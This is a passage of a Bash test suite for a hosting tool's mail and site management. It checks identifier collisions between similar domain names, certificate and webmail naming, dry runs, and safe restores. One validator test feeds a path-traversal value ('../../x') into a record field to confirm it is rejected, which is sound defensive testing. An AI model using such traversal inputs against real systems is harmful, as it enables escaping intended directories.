  assert_eq    "the first one's are as they were, still"                    "$_id_t1" "$(_id_things a-b.example)"
  assert_eq    "and nothing was written into the first one's record all along" "$_id_r1" "$(_id_record a-b.example)"
  assert_true  "whose mail is on"                                           lib_mail_domain_enabled a-b.example
  _id_run lib_mail_domain_add_main a.b.example
  assert_eq    "added again, the second gets the name it had"               "$_id_n2" "$(_id_rec a.b.example)"
  # the other way round: the one that kept the plain name goes, the other one stays what it is
  _id_t2="$(_id_things a.b.example)"
  assert_eq    "the first is removed"                                       0 "$(run_isolated _id_do lib_mail_main domain del a-b.example --no-backup)"
  assert_eq    "the second keeps the name it was given"                     "$_id_n2" "$(lib_mail_ident a.b.example)"
  assert_eq    "and everything under it"                                    "$_id_t2" "$(_id_things a.b.example)"
  _id_run lib_mail_main cert a.b.example
  assert_eq    "it is not renamed back when it is given a certificate"      "$_id_n2" "$(_id_rec a.b.example)"
  _id_run lib_mail_domain_add_main a-b.example
  assert_eq    "the first, added again, takes the plain name: it is free"   "_mail_a_b_example" "$(lib_mail_cert_name a-b.example)"

  # ---- every way two names come out the same ----------------------------------
  _id_fresh
  for _p in "averyveryverylongcompanyname.com averyveryverylongcompanyname.com.tr" "123.example s-123.example" "xn--abc.example xn-abc.example"; do
    read -r _a _b <<<"$_p"
    _id_run lib_mail_domain_add_main "$_a"; _id_run lib_mail_domain_add_main "$_b"
    assert_eq    "one identifier for ${_a} and ${_b}"                       "$(lib_domain_ident "$_a")" "$(lib_domain_ident "$_b")"
    assert_eq    "${_a} goes by it"                                         "$(lib_domain_ident "$_a")" "$(lib_mail_ident "$_a")"
    assert_true  "${_b} does not"                                           test "$(lib_mail_ident "$_a")" != "$(lib_mail_ident "$_b")"
    assert_true  "and what it goes by is a name"                            _id_is_name "$(lib_mail_ident "$_b")"
    assert_true  "certbot was asked for ${_b} under it"                     grep -qxF "$(lib_mail_cert_name "$_b") mail.${_b}" "$_id/certbot.log"
  done
  for _d in a-b-c.example a.b-c.example a-b.c.example; do _id_run lib_mail_domain_add_main "$_d"; done
  assert_eq    "three of one identifier get three names"                    3 "$(for _d in a-b-c.example a.b-c.example a-b.c.example; do lib_mail_ident "$_d"; printf '\n'; done | LC_ALL=C sort -u | grep -c . || true)"
  assert_eq    "and nobody was asked for under another one's"               "$(wc -l <"$_id/certbot.log" | tr -d ' ')" "$(cut -d' ' -f1 "$_id/certbot.log" | LC_ALL=C sort -u | grep -c . || true)"

  # ---- what is on record is believed only when it is a name -------------------
  _id_fresh; _id_old_mail solo.example
  for _v in "../../x" "Upper_case" "has space" "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" "_leading" "9digit"; do
    lib_json_set "$(lib_mail_json solo.example)" '.mail.ident = $v' --arg v "$_v"
    assert_eq  "on record but no name, so not believed: ${_v:0:14}"         "_mail_solo_example" "$(lib_mail_cert_name solo.example)"
  done
  lib_json_set "$(lib_mail_json solo.example)" '.mail.ident = "solo_1a2b3c"'
  assert_eq    "one that is a name is what the domain goes by"              "_wm_solo_1a2b3c" "$(lib_webmail_vhost_name solo.example)"

  # ---- the name is given when the record is made ------------------------------
  _id_fresh; _id_old_mail a-b.example
  _id_run lib_mail_domain_register a.b.example
  assert_eq    "a record made under an identifier that is taken has its name from the start" "a_b_example_$(_id_hash a.b.example)" "$(_id_rec a.b.example)"
  # should that very name be somebody's already, a longer one is tried
  _id_fresh; _id_old_mail a-b.example; _id_old_mail zz.example
  lib_json_set "$(lib_mail_json zz.example)" '.mail.ident = $v' --arg v "a_b_example_$(_id_hash a.b.example)"
  _id_run lib_mail_domain_register a.b.example
  assert_eq    "a name that is taken as well is not given a second time"    "a_b_example_$(printf '%s' a.b.example | sha256sum | cut -c1-8)" "$(_id_rec a.b.example)"

  # ---- a name is somebody's whether their mail is on or not --------------------
  _id_fresh; _id_old_mail a-b.example
  _id_issue _mail_a_b_example mail.a-b.example
  _id_run lib_mail_main disable a-b.example
  assert_false "the first one's mail is switched off"                       lib_mail_domain_enabled a-b.example
  _id_t1="$(_id_things a-b.example)"
  _id_run lib_mail_domain_add_main a.b.example
  assert_eq    "its name is still its own: the second does not get it"      "a_b_example_$(_id_hash a.b.example)" "$(_id_rec a.b.example)"
  assert_eq    "and its certificate, kept for when it is switched on again, is as it was" "$_id_t1" "$(_id_things a-b.example)"
  _id_run lib_mail_main enable a-b.example
  assert_eq    "switched on again, it goes by what it went by"              "_mail_a_b_example" "$(lib_mail_cert_name a-b.example)"

  # ---- a dry run says it and writes nothing ------------------------------------
  _id_fresh; _id_old_mail a-b.example
  _id_r1="$(_id_record a-b.example)"
  OPT_DRY_RUN=1 _id_run lib_mail_domain_add_main a.b.example
  assert_has   "a dry run says the second would get a name of its own"     "would go by a_b_example_$(_id_hash a.b.example)" "$(_id_said)"
  assert_has   "and describes the request it would make under that name"   "would request _mail_a_b_example_$(_id_hash a.b.example) for mail.a.b.example" "$(_id_said)"
  assert_eq    "saying so once"                                             1 "$(grep -c 'would go by' "$_id/said.txt" || true)"
  assert_lacks "and not that it was done"                                   "of a.b.example go by" "$(_id_said)"
  assert_false "and makes no record"                                        test -e "$MAIL_DOMAINS_DIR/a.b.example"
  assert_eq    "nor asks certbot for anything"                              "" "$(_id_asked)"
  assert_eq    "nor touches the first"                                      "$_id_r1" "$(_id_record a-b.example)"

  # ---- two records an older release wrote under one name ----------------------
  # a-b.example with the certificate and the webmail, a.b.example beside it with neither
  _id_pair() {
    _id_fresh
    _id_old_mail a-b.example true
    _id_issue _mail_a_b_example mail.a-b.example webmail.a-b.example
    _id_run lib_webmail_vhost_apply a-b.example
    _id_old_mail a.b.example
    _id_t1="$(_id_things a-b.example)"; _id_r1="$(_id_record a-b.example)"
  }
  _id_pair
  assert_eq    "a record with nothing in it about a name means the identifier" "_mail_a_b_example" "$(lib_mail_cert_name a.b.example)"
  assert_true  "the virtual host under the name is the one's it answers for" lib_webmail_vhost_mine a-b.example
  assert_false "and not the other one's"                                    lib_webmail_vhost_mine a.b.example
  _id_dr="$(_id_doc)"
  assert_eq    "doctor says the two share a name, once"                     1 "$(grep -c '^WARN|mail: ' <<<"$_id_dr" || true)"
  assert_has   "it names the one"                                           "a-b.example" "$_id_dr"
  assert_has   "and the other"                                              "a.b.example" "$_id_dr"
  assert_has   "the name they share"                                        "(a_b_example)" "$_id_dr"
  # The one whose host the certificate does not carry is the one that moves, and it is named
  # first: it takes its own virtual host along, and only then is the name the other one's alone.
  assert_has   "and the commands that take them apart, the one that moves first" "(lomp mail cert a.b.example, then lomp mail cert a-b.example)" "$_id_dr"
  # a domain whose mail is off is given no certificate: "mail cert" refuses it
  lib_json_set "$(lib_mail_json a.b.example)" '.mail.enabled = false'
  _id_dr="$(_id_doc)"
  assert_eq    "it says so too while the mail of one of them is switched off" 1 "$(grep -c '^WARN|mail: ' <<<"$_id_dr" || true)"
  assert_has   "and then names the command that switches it on, for when that is wanted" "when the mail of a.b.example is switched on again: lomp mail enable a.b.example" "$_id_dr"
  assert_lacks "not one that would be refused"                              "lomp mail cert a.b.example" "$_id_dr"
  lib_json_set "$(lib_mail_json a.b.example)" '.mail.enabled = true'
  lib_json_set "$(lib_mail_json a-b.example)" '.mail.enabled = false'
  _id_dr="$(_id_doc)"
  assert_has   "with the mail of the one that stays switched off, the mover's command is all" "(lomp mail cert a.b.example)" "$_id_dr"
  lib_json_set "$(lib_mail_json a-b.example)" '.mail.enabled = true'
  # the webmail of the one that has none is switched on: not over the other one's
  lib_json_set "$(lib_mail_json a.b.example)" '.mail.webmail = true'
  assert_eq    "a virtual host is not written over another domain's: that is a failure" 1 "$(run_isolated _id_do lib_webmail_vhost_apply a.b.example)"
  assert_eq    "and the other one's is as it was"                           "$_id_t1" "$(_id_things a-b.example)"
  assert_has   "doctor says nothing answers for the webmail on record"      "WARN|webmail: webmail.a.b.example|" "$(_id_doc _doc_webmail_unserved)"
  assert_lacks "and nothing of the kind about the one that is served"       "webmail.a-b.example" "$(_id_doc _doc_webmail_unserved)"
  assert_has   "it is the webmail check that asks"                          "_doc_webmail_unserved" "$(declare -f _doc_check_webmail)"
  assert_eq    "its webmail is switched off again"                          0 "$(run_isolated _id_do lib_mail_main webmail off a.b.example)"
  assert_eq    "which takes the flag down"                                  "" "$(jq -r '.mail.webmail // ""' "$(lib_mail_json a.b.example)")"
  assert_eq    "and not the other one's virtual host"                       "$_id_t1" "$(_id_things a-b.example)"
  _id_run lib_webmail_vhost_remove a.b.example
  assert_eq    "nor does a removal asked for by name"                       "$_id_t1" "$(_id_things a-b.example)"
  # removed: what lies under the shared name is the other one's, and stays
  assert_eq    "the one that has nothing under the name is removed"         0 "$(run_isolated _id_do lib_mail_main domain del a.b.example --no-backup)"
  assert_eq    "the other one's certificate, virtual host and maps are as they were" "$_id_t1" "$(_id_things a-b.example)"
  assert_has   "it says the certificate was left, and whose it is"          "is a-b.example's as well" "$(_id_said)"
  assert_eq    "and its record was never written to"                        "$_id_r1" "$(_id_record a-b.example)"
  _id_pair
  assert_eq    "its mail deleted instead: the same"                         0 "$(run_isolated _id_do lib_mail_main disable a.b.example --delete-data)"
  assert_eq    "nothing of the other one's is touched"                      "$_id_t1" "$(_id_things a-b.example)"
  # the one whose certificate it is goes: then it goes
  _id_pair
  _id_r2="$(_id_record a.b.example)"
  assert_eq    "the one the certificate names is removed"                   0 "$(run_isolated _id_do lib_mail_main domain del a-b.example --no-backup)"
  assert_false "its certificate goes with it"                               test -e "$SSL_DEPLOY_DIR/_mail_a_b_example"
  assert_false "and its virtual host"                                       test -e "$LSWS_VHOSTS_DIR/_wm_a_b_example"
  assert_eq    "the other one's record is not written to"                   "$_id_r2" "$(_id_record a.b.example)"

  # taken apart: the one the certificate does not name moves, whichever is asked first
  _id_pair
  _id_run lib_mail_main cert a-b.example
  assert_eq    "a certificate for the one that has it: nothing is asked for" "" "$(_id_asked)"
  assert_eq    "and it is not renamed"                                      "" "$(_id_rec a-b.example)"
  assert_eq    "everything of it is as it was"                              "$_id_t1" "$(_id_things a-b.example)"
  _id_run lib_mail_main cert a.b.example
  _id_n2="$(_id_rec a.b.example)"
  assert_eq    "a certificate for the other one: it gets a name of its own first" "a_b_example_$(_id_hash a.b.example)" "$_id_n2"
  assert_eq    "and is asked for under that, with its own host"             "_mail_${_id_n2} mail.a.b.example|" "$(_id_asked)"
  assert_has   "it says why"                                                "a_b_example is a-b.example's" "$(_id_said)"
  assert_eq    "the first one's certificate still names the first one"      "$_id_t1" "$(_id_things a-b.example)"
  assert_eq    "and its record was not written to"                          "$_id_r1" "$(_id_record a-b.example)"
  assert_eq    "doctor has nothing left to say"                             "" "$(_id_doc)"
  _id_pair
  _id_run lib_mail_main cert a.b.example
  assert_eq    "asked the other way round, it is the same one that moves"   "a_b_example_$(_id_hash a.b.example)" "$(_id_rec a.b.example)"
  assert_eq    "and the one the certificate names stays"                    "" "$(_id_rec a-b.example)"
  # nothing issued yet, and the virtual host under the shared name is the mover's own: it
  # comes along instead of answering for one host under two names
  _id_fresh
  _id_old_mail a-b.example; _id_old_mail a.b.example true
  _id_vhost a.b.example webmail.a.b.example
  _id_run lib_mail_main cert a.b.example
  _id_n2="$(_id_rec a.b.example)"
  assert_true  "with no certificate under the name yet, the one that asks first moves" test -n "$_id_n2"
  assert_false "its virtual host is no longer under the name they shared"   test -e "$LSWS_VHOSTS_DIR/_wm_a_b_example"
  assert_eq    "it is under its own, answering for its own host"            "webmail.a.b.example" "$(_wm_vhost_host a.b.example)"
  assert_eq    "and the listeners know it by that name alone"               "HTTP _wm_${_id_n2} webmail.a.b.example|HTTPS _wm_${_id_n2} webmail.a.b.example|" "$(LC_ALL=C sort "$_id/maps" | tr '\n' '|')"
  assert_eq    "its certificate is asked for with both of its hosts"        "_mail_${_id_n2} mail.a.b.example webmail.a.b.example|" "$(_id_asked)"
  _id_fresh
  _id_old_mail a-b.example; _id_old_mail a.b.example true
  _id_vhost a.b.example webmail.a.b.example
  : >"$_id/certbot.refuses"
  _id_run lib_mail_main cert a.b.example
  assert_has   "certbot refuses this time"                                  "does not point here yet" "$(_id_said)"
  assert_false "the virtual host has left the shared name all the same"     test -e "$LSWS_VHOSTS_DIR/_wm_a_b_example"
  assert_eq    "and is there under its own: a webmail without its certificate, not none" "webmail.a.b.example" "$(_wm_vhost_host a.b.example)"
  rm -f "$_id/certbot.refuses"

  # the certificate under the shared name is one domain's and the virtual host the other's:
  # the second was added after the first one's webmail was switched on
  _id_fresh
  _id_old_mail a.b.example true
  _id_run lib_webmail_vhost_apply a.b.example
  _id_old_mail a-b.example
  _id_issue _mail_a_b_example mail.a-b.example
  _id_t2="$(_id_things a.b.example)"
  assert_eq    "a webmail for the one that has the certificate and not the virtual host" 1 "$(run_isolated _id_do lib_mail_main webmail on a-b.example)"
  assert_has   "is refused with whose the virtual host is"                  "is the webmail of a.b.example" "$(_id_said)"
  assert_has   "and with the command that gives that one a name of its own" "lomp mail cert a.b.example" "$(_id_said)"
  assert_lacks "it does not end by saying there is a webmail"               "Webmail for a-b.example" "$(_id_said)"
  assert_eq    "nor leave the record saying so"                             "" "$(jq -r '.mail.webmail // ""' "$(lib_mail_json a-b.example)")"
  assert_eq    "the other one's virtual host answers for it as before"      "webmail.a.b.example" "$(_wm_vhost_host a.b.example)"
  assert_has   "doctor names the one the certificate does not carry first"  "(lomp mail cert a.b.example, then lomp mail cert a-b.example)" "$(_id_doc)"
  _id_run lib_mail_main cert a.b.example
  assert_true  "that command moves it, virtual host and all"                test -n "$(_id_rec a.b.example)"
  assert_eq    "under its own name it answers for its own webmail"          "webmail.a.b.example" "$(_wm_vhost_host a.b.example)"
  assert_eq    "and now the first can have its webmail"                     0 "$(run_isolated _id_do lib_mail_main webmail on a-b.example)"
  assert_eq    "under the name that is its alone"                           "webmail.a-b.example" "$(_wm_vhost_host a-b.example)"
  assert_eq    "doctor has nothing left to say about either"                "" "$(_id_doc)$(_id_doc _doc_webmail_unserved)"
  # the usual shape the other way round: the certificate carries the second one's host
  _id_fresh
  _id_old_mail a-b.example; _id_old_mail a.b.example
  _id_issue _mail_a_b_example mail.a.b.example
  assert_has   "where the certificate carries the other one's host, the hint turns round" "(lomp mail cert a-b.example, then lomp mail cert a.b.example)" "$(_id_doc)"

  # ---- a site that never had mail, under a mail domain's name -----------------
  _id_fresh
  _id_old_mail a-b.example true; _id_old_site a.b.example
  _id_issue _mail_a_b_example mail.a-b.example webmail.a-b.example
  _id_vhost a-b.example webmail.a-b.example
  _id_t1="$(_id_things a-b.example)"; _id_r1="$(_id_record a-b.example)"
  assert_false "the mail domain's webmail is no trace of mail of the site's" lib_mail_domain_has_traces a.b.example
  assert_false "which is not listed among the domains with mail"            _mail_domain_listed a.b.example
  _id_rs="$(cksum <"$(lib_domain_json a.b.example)")"
  assert_eq    "its webmail is switched off: there is none"                 0 "$(run_isolated _id_do lib_mail_main webmail off a.b.example)"
  assert_eq    "and the mail domain's is as it was"                         "$_id_t1" "$(_id_things a-b.example)"
  assert_eq    "nothing is written into the site's own state for it"        "$_id_rs" "$(cksum <"$(lib_domain_json a.b.example)")"
  assert_eq    "its mail is deleted: there is none"                         0 "$(run_isolated _id_do lib_mail_main disable a.b.example --delete-data)"
  assert_has   "which is what it says"                                      "already off" "$(_id_said)"
  assert_eq    "the mail domain's is as it was, again"                      "$_id_t1" "$(_id_things a-b.example)"
  # what "remove" of the site runs when it finds traces - asked here though there are none
  _id_run lib_mail_domain_purge a.b.example
  assert_eq    "even a purge of the site's mail leaves the mail domain's"   "$_id_t1" "$(_id_things a-b.example)"
  assert_eq    "and its record"                                             "$_id_r1" "$(_id_record a-b.example)"
  assert_eq    "doctor has nothing to say about a site without mail"        "" "$(_id_doc)"
  assert_has   "it is the mail check that asks"                             "_doc_mail_shared_names" "$(declare -f _doc_check_mail)"
  # the day the site gets mail it gets a name of its own, in the site's own state
  _id_run lib_mail_ident_claim a.b.example
  assert_eq    "the site is given a name for its mail"                      "a_b_example_$(_id_hash a.b.example)" "$(jq -r '.mail.ident' "$(lib_domain_json a.b.example)")"
  assert_eq    "its state is otherwise what it was"                         "a.b.example php a_b_example" "$(jq -r '[.domain, .mode, .user] | join(" ")' "$(lib_domain_json a.b.example)")"
  # and the mail domain goes while only a site without mail shares its name: nothing is left over
  _id_fresh
  _id_old_mail a-b.example; _id_old_site a.b.example
  _id_issue _mail_a_b_example mail.something-else.example
  assert_eq    "a mail domain whose name only a site without mail shares is removed" 0 "$(run_isolated _id_do lib_mail_main domain del a-b.example --no-backup)"
  assert_false "and its certificate is not left behind for nobody"          test -e "$SSL_DEPLOY_DIR/_mail_a_b_example"
  # a mail domain with no certificate yet, and a site without mail under the same name
  _id_fresh
  _id_old_mail a-b.example; _id_old_site a.b.example
  _id_run lib_mail_main cert a-b.example
  assert_eq    "a domain whose mail is on does not give way to one that has none" "" "$(_id_rec a-b.example)"
  assert_eq    "its certificate is asked for under the name it has"         "_mail_a_b_example mail.a-b.example|" "$(_id_asked)"
  # three under one name: a site without mail, and two mail domains of which one has the certificate
  _id_fresh
  _id_old_site a--b.example; _id_old_mail a-b.example; _id_old_mail a.b.example
  _id_issue _mail_a_b_example mail.a.b.example
  _id_t2="$(_id_things a.b.example)"
  assert_eq    "three share an identifier, and the one that goes is not the certificate's" 0 "$(run_isolated _id_do lib_mail_main domain del a-b.example --no-backup)"
  assert_eq    "it is left for the one that has mail, though a site without any is listed first" "$_id_t2" "$(_id_things a.b.example)"
  _id_add="$(declare -f lib_domain_add_main)"
  _id_l1="$(grep -n 'lib_domain_state_save' <<<"$_id_add" | head -n 1 | cut -d: -f1 || true)"
  _id_l2="$(grep -n 'lib_mail_ident_claim' <<<"$_id_add" | head -n 1 | cut -d: -f1 || true)"
  _id_l3="$(grep -n 'lib_domain_user_ensure' <<<"$_id_add" | head -n 1 | cut -d: -f1 || true)"
  assert_true  "a new site is given its name once its state is written"     test "${_id_l2:-0}" -gt "${_id_l1:-999999}"
  assert_true  "before anything else of it is made"                         test "${_id_l2:-999999}" -lt "${_id_l3:-0}"

  # ---- a restore brings back the mail, not the name it went by elsewhere ------
  _id_ar() {   # domain, the .mail block in the archive -> the archive
    local w="$_id/ar"
    rm -rf "$w"; mkdir -p "$w/mail" "$BACKUP_ROOT/$1"
    printf '{"format":1,"kind":"mail","domain":"%s","created_at":"2026-01-01T00:00:00Z","maildirs":"doveadm"}\n' "$1" >"$w/manifest.json"
    printf '%s\n' "$2" >"$w/mail/state.json"
    tar -C "$w" -czf "$BACKUP_ROOT/$1/$1-mail-20260101-000000.tar.gz" .
    printf '%s' "$BACKUP_ROOT/$1/$1-mail-20260101-000000.tar.gz"
  }
  _id_fresh
  _id_old_mail a-b.example
  _id_issue _mail_a_b_example mail.a-b.example
  _id_t1="$(_id_things a-b.example)"; _id_r1="$(_id_record a-b.example)"
  # on the server the archive was made on, a.b.example was alone and went by the identifier
  _id_f="$(_id_ar a.b.example '{"enabled":true,"selector":"lomp202603","selectors_used":["lomp202603"],"ident":"a_b_example"}')"
  _id_run lib_mail_restore_domain a.b.example "$_id_f"
  assert_true  "a domain nobody here knew is restored as a mail domain"     lib_mail_domain_enabled a.b.example
  assert_eq    "under a name this server gives it, not the archive's"       "a_b_example_$(_id_hash a.b.example)" "$(_id_rec a.b.example)"
  assert_eq    "its certificate is asked for under that"                    "_mail_a_b_example_$(_id_hash a.b.example) mail.a.b.example|" "$(_id_asked)"
  assert_eq    "the domain that was here is as it was"                      "$_id_t1" "$(_id_things a-b.example)"
  assert_eq    "its record too"                                             "$_id_r1" "$(_id_record a-b.example)"
  # restored over itself, from an archive that carries another server's name for it
  _id_f="$(_id_ar a.b.example '{"enabled":true,"selector":"lomp202603","selectors_used":["lomp202603"],"ident":"somebody_elses"}')"
  _id_run lib_mail_restore_domain a.b.example "$_id_f"
  assert_eq    "restored again, it keeps the name it has here"              "a_b_example_$(_id_hash a.b.example)" "$(_id_rec a.b.example)"
  _id_run lib_mail_main domain del a-b.example --no-backup
  _id_f="$(_id_ar a.b.example '{"enabled":true,"selector":"lomp202603","selectors_used":["lomp202603"]}')"
  _id_run lib_mail_restore_domain a.b.example "$_id_f"
  assert_eq    "and when the other domain is long gone, and the archive says nothing" "a_b_example_$(_id_hash a.b.example)" "$(_id_rec a.b.example)"
  _id_fresh
  _id_f="$(_id_ar solo.example '{"enabled":true,"selector":"lomp202603","selectors_used":["lomp202603"],"ident":"somebody_elses"}')"
  _id_run lib_mail_restore_domain solo.example "$_id_f"
  assert_true  "a domain that shares its identifier with nobody is restored" lib_mail_domain_enabled solo.example
  assert_eq    "with no name on record at all"                              "" "$(_id_rec solo.example)"
  assert_eq    "so it goes by the identifier"                               "_mail_solo_example mail.solo.example|" "$(_id_asked)"
  _id_rs="$(declare -f lib_restore_main)"
  assert_has   "a site's archive does not bring a name along either"        'del(.mail.ident)' "$_id_rs"
  assert_has   "the site is given one here"                                 'lib_mail_ident_claim "$domain"' "$_id_rs"
  assert_false "no removal ever reached outside the test directory"         test -e "$_id/rm-refused.log"
fi

eval "$_id_saved_vars"; eval "$_id_saved_fn"
unset -f _id_issue _id_do _id_run _id_said _id_asked _id_rec _id_is_name _id_hash _id_fresh _id_old_mail _id_old_site _id_vhost _id_things _id_record _id_doc _id_pair _id_ar

# =============================================================================
section "a record that names another site's Linux user is not acted on"
# Two sites cannot share an identifier: they would share a Linux user, and "add" refuses the
# second and rolls its record back. A restore refused it as well - but only after it had put
# the record in place, and that record named the first site's user as its own. "remove" of the
# record, the natural way to be rid of it, then went by that user: it ended the first site's
# processes and deleted its account.
_lr="$TMP/leftover"; rm -rf "$_lr"; mkdir -p "$_lr"
_lr_saved_fn="$(declare -f lib_domains_list)"
eval "$(sed -n '/^lib_domains_list() {/,/^}/p' "$ROOT/lib/common.sh")"
_lr_saved_vars="$(declare -p STATE_DIR SITES_ROOT BACKUP_ROOT CRON_FILE HARDEN_PHP_INI_ROOT INS_ROLE)"
STATE_DIR="$_lr/state"; SITES_ROOT="$_lr/home"; BACKUP_ROOT="$_lr/backups"; CRON_FILE="$_lr/cron"; HARDEN_PHP_INI_ROOT="$_lr/php-ini"; INS_ROLE=""
# The account database is stood in for: one account, a_b_example, the site a-b.example's. So is
# every step of a removal - each says that it ran, and that is what is looked at.
_lr_stubs='lib_require_tools() { return 0; }
  lib_mail_installed() { return 1; }
  id() { [[ "${1:-}" == "-u" && "${2:-}" == "a_b_example" && -e "$_lr/account" ]]; }
  getent() {
    if [[ "${1:-}" == "passwd" && "${2:-}" == "a_b_example" && -e "$_lr/account" ]]; then printf "a_b_example:x:1001:1001:site a-b.example:%s/a-b.example:/usr/sbin/nologin\n" "$SITES_ROOT"; return 0; fi
    if [[ "${1:-}" == "group" && "${2:-}" == "a_b_example" && -e "$_lr/account" ]]; then printf "a_b_example:x:1001:\n"; return 0; fi
    return 2
  }
  pkill()    { printf "pkill %s\n" "$*" >>"$_lr/done.log"; return 0; }
  pgrep()    { return 1; }
  userdel()  { printf "userdel %s\n" "$*" >>"$_lr/done.log"; return 0; }
  groupdel() { printf "groupdel %s\n" "$*" >>"$_lr/done.log"; return 0; }
  lib_ols_vhost_purge()      { printf "vhost %s\n" "$1" >>"$_lr/done.log"; }
  lib_app_teardown()         { printf "app %s\n" "$D_IDENT" >>"$_lr/done.log"; }
  lib_app_state_load()       { return 1; }
  lib_backup_domain()        { printf "backup %s\n" "$1" >>"$_lr/done.log"; }
  lib_db_drop_for_domain()   { printf "db %s\n" "$1" >>"$_lr/done.log"; }
  lib_ssl_delete()           { printf "cert %s\n" "$1" >>"$_lr/done.log"; }
  lib_domain_logrotate_regen() { printf "lists\n" >>"$_lr/lists.log"; }
  lib_domain_fail2ban_regen()  { return 0; }
  lib_sitefw_regen()           { return 0; }
  lib_domain_user_ensure()   { printf "user wanted: %s in %s\n" "$D_USER" "$D_HOME" >>"$_lr/done.log"; exit 7; }
  lib_php_ensure_version()   { return 0; }'
_lr_do()   { eval "$_lr_stubs"; OPT_YES=1; OPT_QUIET=0; "$@" >"$_lr/said.txt" 2>&1 </dev/null; }
_lr_said() { cat "$_lr/said.txt" 2>/dev/null || true; }
_lr_done() { if [[ -f "$_lr/done.log" ]]; then tr '\n' '|' <"$_lr/done.log"; fi; }
# the site that is there, and its account
_lr_fresh() {
  rm -rf "$_lr/state" "$_lr/home" "$_lr/backups" "$_lr/done.log" "$_lr/lists.log" "$_lr/cron"
  mkdir -p "$STATE_DIR/domains/a-b.example" "$SITES_ROOT" "$BACKUP_ROOT"
  printf '{"installed_at":"2026-01-01T00:00:00Z","params":{}}\n' >"$STATE_DIR/manifest.json"
  jq -n --arg h "$SITES_ROOT/a-b.example" '{domain:"a-b.example", ident:"a_b_example", user:"a_b_example", group:"a_b_example", home:$h, mode:"static", status:"active"}' \
    >"$(lib_domain_json a-b.example)"
  : >"$_lr/account"
}
# the archive of a site of the other name, made on a server where it was alone
_lr_archive() {   # -> the archive
  local w="$_lr/ar"
  rm -rf "$w"; mkdir -p "$w/state"
  printf '{"format":1,"domain":"a.b.example","created_at":"2026-01-01T00:00:00Z"}\n' >"$w/manifest.json"
  printf '{"domain":"a.b.example","ident":"a_b_example","user":"a_b_example","group":"a_b_example","home":"/home/a.b.example","mode":"static","status":"active"}\n' >"$w/state/domain.json"
  ( cd "$w" && sha256sum manifest.json state/domain.json >SHA256SUMS )
  tar -C "$w" -czf "$_lr/site.tar.gz" manifest.json state SHA256SUMS
  printf '%s' "$_lr/site.tar.gz"
}

_lr_fresh
_lr_du="${D_USER:-}"; _lr_dh="${D_HOME:-}"
D_USER="a_b_example"; D_HOME="$SITES_ROOT/a-b.example"
assert_eq    "an account whose home is the site's is the site's own"       1 "$(run_isolated _lr_do lib_domain_user_taken)"
D_HOME="$SITES_ROOT/a.b.example"
assert_eq    "one whose home is another site's is taken"                   0 "$(run_isolated _lr_do lib_domain_user_taken)"
D_USER="nobody_has_this"
assert_eq    "a name no account has is free"                               1 "$(run_isolated _lr_do lib_domain_user_taken)"
D_USER=""
assert_eq    "and no name at all is not an account"                        1 "$(run_isolated _lr_do lib_domain_user_taken)"
D_USER="$_lr_du"; D_HOME="$_lr_dh"

# ---- the restore asks before it writes -----------------------------------------
_lr_f="$(_lr_archive)"
_lr_r1="$(cksum <"$(lib_domain_json a-b.example)")"
assert_eq    "a site whose user is another site's is not restored"         1 "$(run_isolated _lr_do lib_restore_main a.b.example --file "$_lr_f")"
assert_has   "it says why"                                                 "the system user a_b_example" "$(_lr_said)"
assert_has   "whose the account is"                                        "${SITES_ROOT}/a-b.example" "$(_lr_said)"
assert_has   "and that nothing was written"                                "nothing was written" "$(_lr_said)"
assert_false "which is so: no record is left of it"                        test -e "$STATE_DIR/domains/a.b.example"
assert_eq    "the sites are the one that was there"                        "a-b.example" "$(lib_domains_list | tr '\n' ' ' | sed 's/ $//')"
assert_eq    "and its record is as it was"                                 "$_lr_r1" "$(cksum <"$(lib_domain_json a-b.example)")"
assert_eq    "a dry run of it is refused the same way"                     1 "$(OPT_DRY_RUN=1 run_isolated _lr_do lib_restore_main a.b.example --file "$_lr_f")"
# The home that counts is the one the site would have HERE. An archive of a-b.example put back
# under another name carries a-b.example's user and a-b.example's home - which is exactly the
# account that exists - and is refused all the same: the new site's home would be another one.
mkdir -p "$_lr/ar2/state"
printf '{"format":1,"domain":"a-b.example","created_at":"2026-01-01T00:00:00Z"}\n' >"$_lr/ar2/manifest.json"
jq -c '.status = "active"' "$(lib_domain_json a-b.example)" >"$_lr/ar2/state/domain.json"
( cd "$_lr/ar2" && sha256sum manifest.json state/domain.json >SHA256SUMS )
tar -C "$_lr/ar2" -czf "$_lr/site2.tar.gz" manifest.json state SHA256SUMS
assert_eq    "a site's archive put back under another name is refused for that site's user" 1 "$(run_isolated _lr_do lib_restore_main c.example --file "$_lr/site2.tar.gz")"
assert_has   "for the same reason"                                         "the system user a_b_example" "$(_lr_said)"
assert_false "and leaves no record either"                                 test -e "$STATE_DIR/domains/c.example"
# where the name is free the restore goes on, and only then is the record written
rm -f "$_lr/account"
assert_eq    "with the user name free it goes on to make the user"         7 "$(run_isolated _lr_do lib_restore_main a.b.example --file "$_lr_f")"
assert_eq    "the site's own, in the site's own home"                      "user wanted: a_b_example in ${SITES_ROOT}/a.b.example|" "$(_lr_done)"
assert_true  "and by then its record is in place"                          test -s "$STATE_DIR/domains/a.b.example/domain.json"

# ---- a record of that kind, left by a release before this one -------------------
_lr_fresh
mkdir -p "$STATE_DIR/domains/a.b.example"
printf '{"domain":"a.b.example","ident":"a_b_example","user":"a_b_example","group":"a_b_example","home":"/home/a.b.example","mode":"static","status":"restoring"}\n' >"$(lib_domain_json a.b.example)"
_lr_r1="$(cksum <"$(lib_domain_json a-b.example)")"
assert_eq    "a dry run of removing it changes nothing"                    0 "$(OPT_DRY_RUN=1 run_isolated _lr_do lib_domain_remove_main a.b.example)"
assert_true  "the record is still there"                                   test -s "$STATE_DIR/domains/a.b.example/domain.json"
assert_eq    "remove of the record a refused restore left"                 0 "$(run_isolated _lr_do lib_domain_remove_main a.b.example)"
assert_has   "it says whose the account is"                                "that account's home is ${SITES_ROOT}/a-b.example" "$(_lr_said)"
assert_eq    "no step of a removal ran: not the account, not the application, not the virtual host" "" "$(_lr_done)"
assert_false "the record is gone from the sites"                           test -e "$STATE_DIR/domains/a.b.example"
assert_true  "put away, not deleted"                                       bash -c "compgen -G '${STATE_DIR}/archive/domains/a.b.example.[0-9]*' >/dev/null"
assert_true  "the lists written from the sites on record are written again" test -s "$_lr/lists.log"
assert_eq    "the site whose account it is has its record as it was"       "$_lr_r1" "$(cksum <"$(lib_domain_json a-b.example)")"
# The same record, copied out of the archive of the very site whose account it is - that
# site's archive restored under the other name. It says that site's user AND that site's
